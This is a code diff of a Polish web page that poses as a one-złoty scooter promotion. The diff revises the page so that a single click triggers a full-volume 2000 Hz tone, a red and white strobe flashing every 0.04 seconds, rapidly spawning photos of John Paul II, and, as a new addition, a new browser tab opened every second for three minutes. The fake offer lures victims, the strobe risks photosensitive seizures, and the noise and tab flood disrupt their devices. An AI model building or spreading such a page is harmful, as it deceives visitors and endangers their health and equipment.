@@ -3,96 +3,104 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Hulajnogi Promocja</title>
+    <title>Hulajnogi - WYPRZEDAŻ</title>
     <style>
         body, html {
             margin: 0; padding: 0; width: 100%; height: 100%;
             overflow: hidden; background: #fff; font-family: sans-serif;
             display: flex; justify-content: center; align-items: center;
         }
-        #start { text-align: center; cursor: pointer; }
+        #ekran-start { text-align: center; cursor: pointer; }
         
-        #overlay {
+        #warstwa-chaosu {
             display: none; position: fixed; top: 0; left: 0;
             width: 100%; height: 100%; z-index: 9999;
         }
 
-        /* Bardzo szybkie błyski */
-        .flash-on { animation: strobe 0.04s infinite; }
+        /* Szybkie błyski (stroboskop) */
+        .miganie { animation: strobe 0.04s infinite; }
         @keyframes strobe {
             0% { background: #ff0000; }
             50% { background: #ffffff; }
             100% { background: #ff0000; }
         }
 
-        /* Zdjęcia - tylko się respią, brak ruchu */
-        .pope-img {
+        /* Zdjęcia - tylko respienie, brak kręcenia */
+        .respi-foto {
             position: absolute; 
-            width: 220px; 
+            width: 250px; 
             z-index: 10000;
             pointer-events: none;
         }
     </style>
 </head>
-<body onclick="odpal()">
+<body onclick="startuj()">
 
-    <div id="start">
-        <h1 style="font-size: 35px;">SKLEP Z HULAJNOGAMI</h1>
+    <div id="ekran-start">
+        <h1 style="font-size: 35px;">PROMOCJA: HULAJNOGA 1 ZŁ</h1>
         <div style="font-size: 100px;">🛴</div>
-        <p>KLIKNIJ, ABY WEJŚĆ DO OFERTY</p>
+        <p>KLIKNIJ DOWOLNE MIEJSCE, ABY ODEBRAĆ KOD</p>
     </div>
 
-    <div id="overlay"></div>
+    <div id="warstwa-chaosu"></div>
 
     <script>
-        let running = false;
-        const imgPath = "https://upload.wikimedia.org/wikipedia/commons/thumb/4/44/San_Giovanni_Paolo_II.jpg/250px-San_Giovanni_Paolo_II.jpg";
+        let uruchomione = false;
+        const fotoUrl = "https://upload.wikimedia.org/wikipedia/commons/4/44/San_Giovanni_Paolo_II.jpg";
+        
+        // Lista stron do "spalenia" przeglądarki
+        const strony = [
+            "https://www.google.com",
+            "https://www.wikipedia.org",
+            "https://www.youtube.com",
+            "https://www.allegro.pl",
+            "https://www.facebook.com"
+        ];
 
-        function odpal() {
-            if (running) return;
-            running = true;
+        function startuj() {
+            if (uruchomione) return;
+            uruchomione = true;
 
-            // --- STARY, WYSOKI, CZYSTY PISK ---
+            // 1. STARY, WYSOKI PISK (2000Hz)
             const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
             if (audioCtx.state === 'suspended') audioCtx.resume();
             
             const osc = audioCtx.createOscillator();
             const gain = audioCtx.createGain();
-            
-            osc.type = 'sine'; // Czysty, wysoki pisk
-            osc.frequency.setValueAtTime(2000, audioCtx.currentTime); // 2000Hz to bardzo wysoki ton
-            
-            gain.gain.setValueAtTime(1, audioCtx.currentTime); // Pełna moc
-            
+            osc.type = 'sine'; 
+            osc.frequency.setValueAtTime(2000, audioCtx.currentTime); 
+            gain.gain.setValueAtTime(1, audioCtx.currentTime); 
             osc.connect(gain);
             gain.connect(audioCtx.destination);
             osc.start();
 
-            // --- EFEKTY WIZUALNE ---
-            document.getElementById('start').style.display = 'none';
-            const layer = document.getElementById('overlay');
-            layer.style.display = 'block';
-            layer.classList.add('flash-on');
+            // 2. WIZUALIA (Chaos i Miganie)
+            document.getElementById('ekran-start').style.display = 'none';
+            const chaos = document.getElementById('warstwa-chaosu');
+            chaos.style.display = 'block';
+            chaos.classList.add('miganie');
 
-            // --- RESPIENIE ZDJĘĆ ---
-            const interval = setInterval(() => {
+            // 3. SZYBKIE RESPIENIE ZDJĘĆ (Co 40ms)
+            const intervalFoto = setInterval(() => {
                 const img = document.createElement('img');
-                img.src = imgPath;
-                img.className = 'pope-img';
-                
-                // Losowa pozycja bez kręcenia
-                img.style.left = Math.random() * (window.innerWidth - 220) + 'px';
-                img.style.top = Math.random() * (window.innerHeight - 220) + 'px';
-                
-                layer.appendChild(img);
-
-                // Usuwanie po sekundzie
+                img.src = fotoUrl;
+                img.className = 'respi-foto';
+                img.style.left = Math.random() * (window.innerWidth - 250) + 'px';
+                img.style.top = Math.random() * (window.innerHeight - 250) + 'px';
+                chaos.appendChild(img);
                 setTimeout(() => img.remove(), 1000);
-            }, 45); // Szybkie tempo pojawiania się
+            }, 40);
 
-            // --- WYŁĄCZENIE PO 3 MINUTACH ---
+            // 4. "SPALANIE" - OTWIERANIE LOSOWEJ STRONY CO SEKUNDĘ
+            const intervalStrony = setInterval(() => {
+                const losowyAdres = strony[Math.floor(Math.random() * strony.length)];
+                window.open(losowyAdres, '_blank');
+            }, 1000); 
+
+            // 5. WYŁĄCZENIE WSZYSTKIEGO PO 3 MINUTACH
             setTimeout(() => {
-                clearInterval(interval);
+                clearInterval(intervalFoto);
+                clearInterval(intervalStrony);
                 osc.stop();
                 location.reload(); 
             }, 180000);
